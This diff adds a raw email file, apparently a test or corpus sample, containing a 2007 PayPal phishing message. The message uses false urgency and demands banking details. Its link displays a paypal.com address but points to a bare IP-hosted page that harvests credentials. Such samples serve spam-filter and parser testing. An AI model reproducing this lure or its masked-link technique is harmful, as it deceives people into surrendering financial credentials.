@@ -1,0 +1,91 @@
+From nobody Sun Jan 25 13:50:03 2015
+Return-Path: <service@paypal.com>
+X-Original-To: user@login.example.com
+Delivered-To: user@login.example.com
+Received: from mail.example.org (mail.example.org [192.168.4.9])
+ by example.com (Postfix) with ESMTP id 90F5D46905
+ for <user@login.example.com>; Tue, 15 May 2007 00:13:32 -0400 (EDT)
+Received: from mail.example.org (mail.example.org [192.168.6.4])
+ by mail.example.org (Postfix) with ESMTP id 8447C131F9CD
+ for <user@example.com>; Tue, 15 May 2007 00:13:32 -0400 (EDT)
+Received: from broughton.textdrive.com (broughton.textdrive.com
+ [207.7.108.209])
+ by mail.example.org (Postfix) with ESMTP id 7A98E6FA1A8
+ for <user@example.com>; Tue, 15 May 2007 00:13:32 -0400 (EDT)
+Received: from User (unknown [162.84.13.148])
+ by broughton.textdrive.com (Postfix) with ESMTP id 7069CE72CB;
+ Tue, 15 May 2007 04:13:24 +0000 (UTC)
+Reply-To: <service@paypal.com>
+From: "Paypal"<service@paypal.com>
+Subject: PayPal Account® Posible Fraud - Notification
+Date: Tue, 15 May 2007 00:13:28 -0400
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="Windows-1251"
+Content-Transfer-Encoding: 7bit
+X-Priority: 3
+X-MSMail-Priority: Normal
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+Message-Id: <20070515041324.7069CE72CB@broughton.textdrive.com>
+To: undisclosed-recipients:;
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 1261
+
+<HTML>
+<HEAD>
+<META NAME="GENERATOR" Content="Microsoft DHTML Editing Control">
+<TITLE></TITLE>
+</HEAD>
+<BODY>
+<P>PayPal Account® Posible Fraud - Notification<BR>Security 
+check !<BR><BR>You have received this email because your account has been used 
+from different locations by you or someone else.<BR>For security purpose, we are 
+required to open an investigation into this matter.<BR><FONT 
+face="Times New Roman"><BR></FONT>In order to safeguard your account, we require 
+that you confirm your banking details.<BR>To help speed up this process, please 
+access the following link so we cancomplete the verification of<BR>your PayPal 
+Account:<BR><BR><B><BR><BR>Alert code:&nbsp;1125452186 <BR><BR><A 
+onclick="return ShowLinkWarning()" href="http://210.89.230.90/neojs/.us/paypal.php" 
+target=_blank rel=nofollow><SPAN id=lw_1177972846_0 
+style="BACKGROUND: none transparent scroll repeat 0% 0%"><SPAN 
+id=lw_1178057431_0 
+style="BACKGROUND: none transparent scroll repeat 0% 0%"><SPAN 
+id=lw_1179099368_0 
+style="BACKGROUND: none transparent scroll repeat 0% 0%"><FONT 
+color=#003399>https://www.paypal.com/cgi-bin/webscr?cmd=_login-submit/?1125452186</FONT></SPAN></SPAN></SPAN></A> 
+</B><BR>
+<TABLE 
+style="PADDING-RIGHT: 0px; PADDING-LEFT: 0px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; BORDER-COLLAPSE: collapse" 
+cellSpacing=0 cellPadding=0 width="100%" bgColor=#ff9966>
+  
+  <TR>
+    <TD width="100%">Please Note:<BR>If we do no receive the appropriate 
+      account verification within 48 hours, then we will assume this PayPal Bank 
+      account is fraudulent and will be suspended. The purpose of this 
+      verification is to ensure that your bank account has not been fraudulently 
+      used and to combat the fraud from our community.</TD></TR></TABLE></P>
+<P dir=ltr align=left>We appreciate your support and understanding and thank you 
+for your prompt attention to this matter.<BR><BR>Regards, 
+<P>PayPal - Paypal Account® Security Department</P>
+<P>
+<TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 cellPadding=0 
+width="100%" border=0>
+  
+  <TR>
+    <TD width="100%" bgColor=#004f4f>
+      <P align=center><B><FONT color=#ffffff>© 2007 PayPal Account &amp; 
+      Co.</FONT></B></P></TD></TR>
+  <TR>
+    <TD width="100%">
+      <P dir=ltr align=center><FONT color=#999999 size=2>Please do not reply to 
+      this email as this is only a notification. Mail sent to this address 
+      cannot be answered.</FONT></P></TD></TR>
+  <TR>
+    <TD width="100%" bgColor=#004f4f>
+      <DIV align=center><FONT color=#ffffff>PayPal Account® Banking 
+      Departament</FONT></DIV></TD></TR></TABLE></P>
+</BODY>
+</HTML>
